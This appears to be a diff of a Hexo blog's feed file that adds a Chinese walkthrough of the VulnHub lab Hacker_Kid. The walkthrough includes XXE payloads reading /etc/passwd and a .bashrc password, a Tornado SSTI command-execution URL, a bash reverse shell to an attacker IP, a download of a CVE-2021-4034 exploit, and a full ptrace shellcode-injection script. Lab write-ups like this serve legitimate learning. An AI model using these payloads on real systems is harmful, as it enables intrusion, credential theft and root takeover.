@@ -692,7 +692,7 @@
 <p>挨个儿访问</p>
 <h3 id="git-泄露"><a href="#git-泄露" class="headerlink" title="git 泄露"></a>git 泄露</h3><p><img src="https://gitee.com/czheisenberg/blog-imgs/raw/master/imgs/20220218105450.png"><br><strong>python2 .\git_extract.py <a href="http://192.168.91.191/.git/">http://192.168.91.191/.git/</a></strong><br><br>注意：git_extract 工具有时候可能下载不完整，推荐方法换一个工具，github开源很多。<br><img src="https://gitee.com/czheisenberg/blog-imgs/raw/master/imgs/20220218105124.png"><br><br>用工具下载到本地。<br><img src="https://gitee.com/czheisenberg/blog-imgs/raw/master/imgs/20220218105212.png"></p>
 <h4 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h4><p><strong>index.php</strong> 中：<br><img src="https://gitee.com/czheisenberg/blog-imgs/raw/master/imgs/20220218105813.png"><br><br>很明显看到 dashboard.php?id=xxxx， 且 跟 SESSION 相关。</p>
-<p><strong>login.php</strong>中:<br><img src="https://gitee.com/czheisenberg/blog-imgs/raw/master/imgs/20220218105925.png"><br><br>如图所示：有账号密码(<strong><a href="mailto:&#108;&#x75;&#115;&#104;&#64;&#97;&#x64;&#109;&#x69;&#110;&#46;&#99;&#x6f;&#109;">&#108;&#x75;&#115;&#104;&#64;&#97;&#x64;&#109;&#x69;&#110;&#46;&#99;&#x6f;&#109;</a>:321</strong>)，待会儿看能不能登陆进去。</p>
+<p><strong>login.php</strong>中:<br><img src="https://gitee.com/czheisenberg/blog-imgs/raw/master/imgs/20220218105925.png"><br><br>如图所示：有账号密码(<strong><a href="mailto:&#108;&#x75;&#x73;&#104;&#x40;&#97;&#x64;&#x6d;&#x69;&#x6e;&#x2e;&#x63;&#x6f;&#109;">&#108;&#x75;&#x73;&#104;&#x40;&#97;&#x64;&#x6d;&#x69;&#x6e;&#x2e;&#x63;&#x6f;&#109;</a>:321</strong>)，待会儿看能不能登陆进去。</p>
 <p><strong>login.php 0904b1</strong> 中:<br><img src="https://gitee.com/czheisenberg/blog-imgs/raw/master/imgs/20220218110150.png"><br><br>如图所示: 得到了 sql 语句，其中对 email,pass 两个变量调用了 <strong>mysqli_real_escape_string</strong>,<strong>htmlspecialchars</strong> 这两个函数，这两个函数的作用大致就是对其输入进行转换过滤，那么在<strong>登陆界面</strong>sql注入几乎是不太可能的了。函数具体用法自行翻看手册。</p>
 <p><strong>config.php</strong> 中:<br><img src="https://gitee.com/czheisenberg/blog-imgs/raw/master/imgs/20220218110713.png"><br><br>如图所示: 用户名: root ，密码：空，数据库: darkhole_2</p>
 <p><strong>COMMIT_EDITMSG</strong> 中:<br><img src="https://gitee.com/czheisenberg/blog-imgs/raw/master/imgs/20220218110827.png"><br><br>如图所示: 翻译过来:  我更改了 login.php 文件以更安全</p>
@@ -730,6 +730,105 @@
 <li>命令执行</li>
 <li>反弹shell</li>
 <li>CVE-2021-4034</li>
+</ol>
+]]></content>
+      <categories>
+        <category>web渗透</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>vulnhub靶场——Hacker_Kid-v1.0.1</title>
+    <url>/2022/03/03/vulnhub%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94Hacker-Kid-v1-0-1/</url>
+    <content><![CDATA[<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>攻击机: kali/win11<br>靶机: Hacker_Kid-v1.0.1 192.168.91.0 网段 NAT<br>下载链接:</p>
+<p><a href="https://download.vulnhub.com/hackerkid/Hacker_Kid-v1.0.1.ova">https://download.vulnhub.com/hackerkid/Hacker_Kid-v1.0.1.ova</a><br><img src="https://gitee.com/czheisenberg/blog-imgs/raw/master/imgs/20220303101129.png"></p>
+<h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><p><a href="https://github.com/czheisenberg/MyCode/blob/master/Scan/scapy/ping.py">https://github.com/czheisenberg/MyCode/blob/master/Scan/scapy/ping.py</a><br><strong>python3 ping.py -H 192.168.91.0/24</strong><br><img src="https://gitee.com/czheisenberg/blog-imgs/raw/master/imgs/20220303101640.png"></p>
+<p>如图所示得到了目标IP地址: 192.168.91.192</p>
+<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p><strong>nmap -sV -A -p- -T4 192.168.91.192 –oN Hacker_kid_nmap.txt</strong><br><img src="https://gitee.com/czheisenberg/blog-imgs/raw/master/imgs/20220303102446.png"></p>
+<p>如图所示开放了 53(DNS服务)，80(HTTP apache服务) ， 9999（HTTP tornado服务）tornado为python的web框架。</p>
+<h2 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h2><p>同时进行目录扫描</p>
+<p><a href="http://192.168.91.192/">http://192.168.91.192/</a><br><img src="https://gitee.com/czheisenberg/blog-imgs/raw/master/imgs/20220303102728.png"></p>
+<p><a href="http://192.168.91.192:9999/login?next=/">http://192.168.91.192:9999/login?next=/</a><br><img src="https://gitee.com/czheisenberg/blog-imgs/raw/master/imgs/20220303102809.png"></p>
+<p><strong>python3 dirsearch.py -u <a href="http://192.168.91.192/">http://192.168.91.192/</a></strong><br><img src="https://gitee.com/czheisenberg/blog-imgs/raw/master/imgs/20220303103034.png"><br><strong>python3 dirsearch.py -u <a href="http://192.168.91.192:9999/">http://192.168.91.192:9999/</a></strong><br><img src="https://gitee.com/czheisenberg/blog-imgs/raw/master/imgs/20220303103701.png"><br>从扫描两个web端口的目录来看没有什么有用的。</p>
+<p>发现80端口网页的源代码中有一行注释：<br><img src="https://gitee.com/czheisenberg/blog-imgs/raw/master/imgs/20220303104045.png"><br>如图所示告诉我们提交一个 GET 参数 page_no 来浏览页面。<br>按照这个方法试试看。猜测sql注入？测试过后似乎行不通</p>
+<p><a href="http://192.168.91.192/?page_no=1">http://192.168.91.192/?page_no=1</a><br><img src="https://gitee.com/czheisenberg/blog-imgs/raw/master/imgs/20220303104215.png"><br>如图所示当提交了 page_no=1 时返回了一句嘲讽的话:<br><strong>Oh Man !! Isn’t is right to go a little deep inside?</strong></p>
+<p>多提交几个数字看结果有什么不一样的。<br><img src="https://gitee.com/czheisenberg/blog-imgs/raw/master/imgs/20220303104906.png"><br><img src="https://gitee.com/czheisenberg/blog-imgs/raw/master/imgs/20220303111817.png"></p>
+<p><img src="https://gitee.com/czheisenberg/blog-imgs/raw/master/imgs/20220303112241.png"><br>如图所示爆破处理结果，当 page_no=21时，有不一样的结果:<br><code>Okay so you want me to speak something ?&lt;br&gt;I am a hacker kid not a dumb hacker. So i created some subdomains to return back on the server whenever i want!!&lt;br data-tomark-pass&gt;Out of my many homes...one such home..one such home for me : hackers.blackhat.local</code><br>翻译一下: 大致意思在说他不是一个傻逼的黑客，创建了一个 域名，那么我们把 hackers.blackhat.local 添加到 /etc/hosts 中。</p>
+<p><img src="https://gitee.com/czheisenberg/blog-imgs/raw/master/imgs/20220303112837.png"><br>然后刷新 DNS<br><img src="https://gitee.com/czheisenberg/blog-imgs/raw/master/imgs/20220303112921.png"><br>然后打开这个域名</p>
+<p><a href="http://hackers.blackhat.local/">http://hackers.blackhat.local/</a></p>
+<p><img src="https://gitee.com/czheisenberg/blog-imgs/raw/master/imgs/20220303113127.png"><br>可见还是和原来一样的。</p>
+<h2 id="dig"><a href="#dig" class="headerlink" title="dig"></a>dig</h2><p>dig(域信息搜索器)命令是一个用于查询DNS域名服务器的工具。执行DNS搜索。</p>
+<p><strong>dig hackers.blackhat.local @192.168.91.192</strong><br><img src="https://gitee.com/czheisenberg/blog-imgs/raw/master/imgs/20220303122002.png"></p>
+<p>如图所示得到了域名，把它们加入 /etc/hosts 中 然后刷新DNS缓存<br><img src="https://gitee.com/czheisenberg/blog-imgs/raw/master/imgs/20220303122141.png"></p>
+<p><a href="http://hackerkid.blackhat.local/">http://hackerkid.blackhat.local/</a></p>
+<p><img src="https://gitee.com/czheisenberg/blog-imgs/raw/master/imgs/20220303122313.png"><br>打开来到一个注册页面。<br>查看源代码发现了 XML 语句<br><img src="https://gitee.com/czheisenberg/blog-imgs/raw/master/imgs/20220303122528.png"></p>
+<p>看到这个不禁联想到 XXE外部实体注入漏洞，正好最近几天在学习XXE漏洞。<br>先随便填写一些数据到表单中。抓包构造语句。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">&lt;!ENTITY ohh SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;&lt;name&gt;ohh&lt;/name&gt;&lt;tel&gt;123456789&lt;/tel&gt;&lt;email&gt;</span><br><span class="line">&amp;ohh;</span><br><span class="line">&lt;/email&gt;&lt;password&gt;password&lt;/password&gt;&lt;/root&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/czheisenberg/blog-imgs/raw/master/imgs/20220303123021.png"></p>
+<p>如图所示成功读取到了 /etc/passwd 的内容。</p>
+<p>筛选了以下只有两个用户 具有 /bin/bash</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">……</span><br><span class="line">saket:x:1000:1000:Ubuntu,,,:/home/saket:/bin/bash</span><br></pre></td></tr></table></figure>
+
+<p>一般可以搭配 伪协议读取文件。<br>问题来了不知道读取哪些文件有用，参考了一下网上的wp，读取 saket home目录下的 .bashrc 文件。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">&lt;!ENTITY ohh SYSTEM &quot;php://filter/convert.base64-encode/resource=/home/saket/.bashrc&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;&lt;name&gt;ohh&lt;/name&gt;&lt;tel&gt;123456789&lt;/tel&gt;&lt;email&gt;</span><br><span class="line">&amp;ohh;</span><br><span class="line">&lt;/email&gt;&lt;password&gt;password&lt;/password&gt;&lt;/root&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/czheisenberg/blog-imgs/raw/master/imgs/20220303135848.png"></p>
+<p>得到了 .bashrc 问价的内容，base64解码:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># enable programmable completion features (you don&#x27;t need to enable</span><br><span class="line"># this, if it&#x27;s already enabled in /etc/bash.bashrc and /etc/profile</span><br><span class="line"># sources /etc/bash.bashrc).</span><br><span class="line">if ! shopt -oq posix; then</span><br><span class="line">  if [ -f /usr/share/bash-completion/bash_completion ]; then</span><br><span class="line">    . /usr/share/bash-completion/bash_completion</span><br><span class="line">  elif [ -f /etc/bash_completion ]; then</span><br><span class="line">    . /etc/bash_completion</span><br><span class="line">  fi</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">#Setting Password for running python app</span><br><span class="line">username=&quot;admin&quot;</span><br><span class="line">password=&quot;Saket!#$%@!!&quot;</span><br></pre></td></tr></table></figure>
+
+<p>在文件的最后拿到了用户名和密码:<br><strong>admin:Saket!#$%@!!</strong></p>
+<p>现在就可以尝试在 9999 端口登陆了。<br>测试发现，直接使用 这个账号密码登陆失败。<br><img src="https://gitee.com/czheisenberg/blog-imgs/raw/master/imgs/20220303140751.png"></p>
+<p>因为这个文件是在 /home/saket 目录下面的。所以得到账号密码: <strong>saket:Saket!#$%@!!</strong><br>经测试登陆成功。<br><img src="https://gitee.com/czheisenberg/blog-imgs/raw/master/imgs/20220303141649.png"></p>
+<p>好，现在登陆成功，页面告诉我们： Tell me your name.<br>我们在信息收集的时候已经知道了9999端口是 tornado python的框架，那么一般容易考 SSTI ,先来测试一下能否显示name</p>
+<p><img src="https://gitee.com/czheisenberg/blog-imgs/raw/master/imgs/20220303144713.png"><br>如图所示可以显示内容<br>尝试SSTI 注入，详细步骤省略。</p>
+<p>查看目录下的文件</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[http://<span class="number">192.168</span><span class="number">.91</span><span class="number">.192</span>:<span class="number">9999</span>/?name=&#123;&#123;<span class="string">&#x27;&#x27;</span>.**<span class="class"><span class="keyword">class</span>**.**<span class="title">mro</span>**\[1\].**<span class="title">subclasses</span>**()\[132\].**<span class="title">init</span>**.**<span class="title">globals</span>**\[&#x27;<span class="title">popen</span>&#x27;\](<span class="params"><span class="string">&#x27;ls&#x27;</span></span>).<span class="title">read</span>()&#125;&#125;/](<span class="params">http://<span class="number">192.168</span><span class="number">.91</span><span class="number">.192</span>:<span class="number">9999</span>/?name=%7B%7<span class="string">B&#x27;&#x27;</span>.__class__.__mro__%5B1%5D.__subclasses__%<span class="number">28</span>%<span class="number">29</span>%5B132%5D.__init__.__globals__%5<span class="string">B&#x27;popen&#x27;</span>%5D%<span class="number">28</span><span class="string">&#x27;ls&#x27;</span>%<span class="number">29.</span>read%<span class="number">28</span>%<span class="number">29</span>%7D%7D/</span>)</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/czheisenberg/blog-imgs/raw/master/imgs/20220303145303.png"></p>
+<p>想直接找 flag 发现这不光是ctf web题，这个是靶机，我们得反弹shell.</p>
+<h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>先开启 监听<br><strong>nc -lvnp 4444</strong></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">http://<span class="number">192.168</span><span class="number">.91</span><span class="number">.192</span>:<span class="number">9999</span>/?name=&#123;% <span class="keyword">import</span> os %&#125;&#123;&#123;os.system(<span class="string">&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/172.30.6.172/4444 0&gt;&amp;1&quot;&#x27;</span>)&#125;&#125;/</span><br></pre></td></tr></table></figure>
+
+<p>将 URL 编码</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[http://<span class="number">192.168</span><span class="number">.91</span><span class="number">.192</span>:<span class="number">9999</span>/?name=&#123;%%20<span class="keyword">import</span>%20os%<span class="number">20</span>%&#125;&#123;&#123;os.system(<span class="string">&#x27;bash%20-c%20&quot;bash%20-i%20&gt;&amp;%20/dev/tcp/172.30.6.172/4444%200&gt;&amp;1&quot;&#x27;</span>)&#125; &#125;/](http://<span class="number">192.168</span><span class="number">.91</span><span class="number">.192</span>:<span class="number">9999</span>/?name=%7B%<span class="number">25</span>%20<span class="keyword">import</span>%20os%<span class="number">20</span>%<span class="number">25</span>%7D%7B%7Bos.system%<span class="number">28</span><span class="string">&#x27;bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.30.6.172%2F4444%200%3E%261%22&#x27;</span>%<span class="number">29</span>%7D%7D/)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/czheisenberg/blog-imgs/raw/master/imgs/20220303150515.png"><br>如图所示成功getshell。</p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h3><p>查找 SUID<br><strong>find / -perm -u=s -type f 2&gt;/dev/null</strong><br><img src="https://gitee.com/czheisenberg/blog-imgs/raw/master/imgs/20220303151157.png"><br>如图所示查找到了一个十分眼熟得文件。如果看过我之前得文章，你就会知知 CVE-2021-4034 这个漏洞的强大，正常情况下只要是2021年及其以前的linux 系统都含有这个漏洞，所以该漏洞使用方法我不详细介绍，可以翻看我以前的文章。</p>
+<p>首先将 exp 下载下来。在本地开启一个http服务用于下载到靶机当中。</p>
+<p><strong>python3 -m http.server</strong><br><img src="https://gitee.com/czheisenberg/blog-imgs/raw/master/imgs/20220303151441.png"></p>
+<p>然后在靶机上切换到 /tmp 目录下。执行 wget 下载<br><strong>wget <a href="http://172.30.6.172:8000/CVE-2021-4034.zip">http://172.30.6.172:8000/CVE-2021-4034.zip</a></strong><br><img src="https://gitee.com/czheisenberg/blog-imgs/raw/master/imgs/20220303151543.png"><br>如图所示下载成功</p>
+<p>现在将其解压<br><strong>unzip CVE-2021-4034.zip</strong><br><img src="https://gitee.com/czheisenberg/blog-imgs/raw/master/imgs/20220303151657.png"></p>
+<p>然后进入解压目录执行 <strong>./cve-2021-4034</strong><br><img src="https://gitee.com/czheisenberg/blog-imgs/raw/master/imgs/20220303151800.png"><br>如图所示成功拿到了 root 权限。<br>现在可以为所欲为了。</p>
+<h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>由于方法一的漏洞利用方式是 非预期的方法（万金油）。<br>查看 .bash_history 发现了一些有趣的东西。<br><strong>cat .bash_history</strong><br><img src="https://gitee.com/czheisenberg/blog-imgs/raw/master/imgs/20220303152348.png"><br>如图所示：从这些字样可以得出结论：靶机本地 5600端口开放这一个服务。我们来验证一下：<br><strong>ss -antp</strong> or <strong>netstat -tunlp</strong> 这两个命令类似，都可以查看本地端口占用信息。<br><img src="https://gitee.com/czheisenberg/blog-imgs/raw/master/imgs/20220303152859.png"><br><img src="https://gitee.com/czheisenberg/blog-imgs/raw/master/imgs/20220303152924.png"><br>如图所示：都没有看到有 5600 端口。</p>
+<p>使用 enumeration 工具</p>
+<p><strong>./lse.sh -l 1 -i | more</strong><br><img src="https://gitee.com/czheisenberg/blog-imgs/raw/master/imgs/20220303174202.png"></p>
+<p>如图所示：使用 enumeration List files with capabilties 中列除了一个文件:<br>**/usr/bin/python2.7 = cap_sys_ptrace+ep **</p>
+<p>当python 具有 cap_sys_ptrace+ep 时，可以提权，参考链接:</p>
+<p><a href="https://www.cnblogs.com/zlgxzswjy/p/15185591.html">https://www.cnblogs.com/zlgxzswjy/p/15185591.html</a></p>
+<p>提权脚本:</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># inject.py# The C program provided at the GitHub Link given below can be used as a reference for writing the python script.</span></span><br><span class="line"><span class="comment"># GitHub Link: https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="comment"># Macros defined in &lt;sys/ptrace.h&gt;</span></span><br><span class="line"><span class="comment"># https://code.woboq.org/qt5/include/sys/ptrace.h.html</span></span><br><span class="line"></span><br><span class="line">PTRACE_POKETEXT   = <span class="number">4</span></span><br><span class="line">PTRACE_GETREGS    = <span class="number">12</span></span><br><span class="line">PTRACE_SETREGS    = <span class="number">13</span></span><br><span class="line">PTRACE_ATTACH     = <span class="number">16</span></span><br><span class="line">PTRACE_DETACH     = <span class="number">17</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Structure defined in &lt;sys/user.h&gt;</span></span><br><span class="line"><span class="comment"># https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user_regs_struct</span>(<span class="params">ctypes.Structure</span>):</span></span><br><span class="line">    _fields_ = [</span><br><span class="line">        (<span class="string">&quot;r15&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;r14&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;r13&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;r12&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;rbp&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;rbx&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;r11&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;r10&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;r9&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;r8&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;rax&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;rcx&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;rdx&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;rsi&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;rdi&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;orig_rax&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;rip&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;cs&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;eflags&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;rsp&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;ss&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;fs_base&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;gs_base&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;ds&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;es&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;fs&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;gs&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">libc = ctypes.CDLL(<span class="string">&quot;libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">pid=<span class="built_in">int</span>(sys.argv[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># Define argument type and respone type.</span></span><br><span class="line">libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]</span><br><span class="line">libc.ptrace.restype = ctypes.c_uint64</span><br><span class="line"></span><br><span class="line"><span class="comment"># Attach to the process</span></span><br><span class="line">libc.ptrace(PTRACE_ATTACH, pid, <span class="literal">None</span>, <span class="literal">None</span>)</span><br><span class="line">registers=user_regs_struct()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Retrieve the value stored in registers</span></span><br><span class="line">libc.ptrace(PTRACE_GETREGS, pid, <span class="literal">None</span>, ctypes.byref(registers))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Instruction Pointer: &quot;</span> + <span class="built_in">hex</span>(registers.rip))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Injecting Shellcode at: &quot;</span> + <span class="built_in">hex</span>(registers.rip))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Shell code copied from exploit db.</span></span><br><span class="line">shellcode=<span class="string">&quot;\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Inject the shellcode into the running process byte by byte.</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>,<span class="built_in">len</span>(shellcode),<span class="number">4</span>):</span><br><span class="line"> </span><br><span class="line">  <span class="comment"># Convert the byte to little endian.</span></span><br><span class="line">  shellcode_byte_int=<span class="built_in">int</span>(shellcode[i:<span class="number">4</span>+i].encode(<span class="string">&#x27;hex&#x27;</span>),<span class="number">16</span>)</span><br><span class="line">  shellcode_byte_little_endian=struct.pack(<span class="string">&quot;&lt;I&quot;</span>, shellcode_byte_int).rstrip(<span class="string">&#x27;\x00&#x27;</span>).encode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">  shellcode_byte=<span class="built_in">int</span>(shellcode_byte_little_endian,<span class="number">16</span>)</span><br><span class="line"> </span><br><span class="line">  <span class="comment"># Inject the byte.</span></span><br><span class="line">  libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip+i),shellcode_byte)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Shellcode Injected!!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Modify the instuction pointer</span></span><br><span class="line">registers.rip=registers.rip+<span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set the registers</span></span><br><span class="line">libc.ptrace(PTRACE_SETREGS, pid, <span class="literal">None</span>, ctypes.byref(registers))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Final Instruction Pointer: &quot;</span> + <span class="built_in">hex</span>(registers.rip))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Detach from the process.</span></span><br><span class="line">libc.ptrace(PTRACE_DETACH, pid, <span class="literal">None</span>, <span class="literal">None</span>)</span><br></pre></td></tr></table></figure>
+
+<p>将脚本保存到靶机中<br><img src="https://gitee.com/czheisenberg/blog-imgs/raw/master/imgs/20220303180646.png"></p>
+<p><img src="https://gitee.com/czheisenberg/blog-imgs/raw/master/imgs/20220303180709.png"></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">`for i in`ps -ef|grep root|grep -v &quot;grep&quot;|awk &#x27;&#123;print $2&#125;&#x27;`; do python2.7 injection.py $i; done`</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/czheisenberg/blog-imgs/raw/master/imgs/20220303180856.png"><br>执行效果如图所示</p>
+<p>查看 本地是否开启了 5600 端口<br><strong>ss -antp | grep “5600”</strong><br><img src="https://gitee.com/czheisenberg/blog-imgs/raw/master/imgs/20220303181123.png"></p>
+<p>然后 nc 链接即可</p>
+<p><strong>nc 192.168.91.192 5600</strong></p>
+<p><img src="https://gitee.com/czheisenberg/blog-imgs/raw/master/imgs/20220303181922.png"><br>如图所示拿到了 root权限</p>
+<p>参考链接:</p>
+<p><a href="https://blog.pentesteracademy.com/privilege-escalation-by-abusing-sys-ptrace-linux-capability-f6e6ad2a59cc">https://blog.pentesteracademy.com/privilege-escalation-by-abusing-sys-ptrace-linux-capability-f6e6ad2a59cc</a></p>
+<p><a href="https://www.youtube.com/watch?v=p1y8Zf8YdiA">https://www.youtube.com/watch?v=p1y8Zf8YdiA</a></p>
+<p><a href="https://blog.csdn.net/qwweggfe/article/details/119861584">https://blog.csdn.net/qwweggfe/article/details/119861584</a></p>
+<p><a href="https://www.cnblogs.com/zlgxzswjy/p/15185591.html">https://www.cnblogs.com/zlgxzswjy/p/15185591.html</a></p>
+<h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><ol>
+<li>新学到了 dig(域信息搜索器) 工具。这是参考了大佬的wp才知道的。</li>
+<li>靶机涉及到了 XXE漏洞 SSTI 注入，对于这两个漏洞，我有一定的了解。</li>
+<li>import os;os.system(‘bash -c “bash -i &gt;&amp; /dev/tcp/172.30.6.172/4444 0&gt;&amp;1 python getshell 的方式。</li>
+<li>使用非预期的方式提权:CVE-2021-4034 ，这个漏洞是个万金油，基本上能通杀2021年及其以前的机器。十分方便。</li>
+<li>Python 具有 cap_sys_ptrace+ep 时可以提权，这个东西头一次见到。不看wp始终差点儿力量。</li>
+<li>总得来说这个靶机有点儿难度，通过这次练习，学到了一些新的知识。再接再厉。</li>
 </ol>
 ]]></content>
       <categories>
@@ -824,13 +923,13 @@
       </categories>
   </entry>
   <entry>
-    <title>web渗透——Dina-1-0-1</title>
-    <url>/2021/12/08/web%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94Dina-1-0-1/</url>
-    <content><![CDATA[<h2 id="web渗透——Dina-1-0-1"><a href="#web渗透——Dina-1-0-1" class="headerlink" title="web渗透——Dina-1-0-1"></a>web渗透——Dina-1-0-1</h2><p>靶机:</p>
+    <title>web渗透——Easy_cloudantivirus</title>
+    <url>/2022/01/12/web%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94Easy-cloudantivirus/</url>
+    <content><![CDATA[<h2 id="web渗透——Easy-cloudantivirus"><a href="#web渗透——Easy-cloudantivirus" class="headerlink" title="web渗透——Easy_cloudantivirus"></a>web渗透——Easy_cloudantivirus</h2><p>靶机:</p>
 
 
 	<div class="row">
-    <embed src="Dina-1-0-1.pdf" width="100%" height="550" type="application/pdf">
+    <embed src="easy_cloudantivirus.pdf" width="100%" height="550" type="application/pdf">
 	</div>
 
 
@@ -842,13 +941,13 @@
       </categories>
   </entry>
   <entry>
-    <title>web渗透——Easy_cloudantivirus</title>
-    <url>/2022/01/12/web%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94Easy-cloudantivirus/</url>
-    <content><![CDATA[<h2 id="web渗透——Easy-cloudantivirus"><a href="#web渗透——Easy-cloudantivirus" class="headerlink" title="web渗透——Easy_cloudantivirus"></a>web渗透——Easy_cloudantivirus</h2><p>靶机:</p>
+    <title>web渗透——Dina-1-0-1</title>
+    <url>/2021/12/08/web%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94Dina-1-0-1/</url>
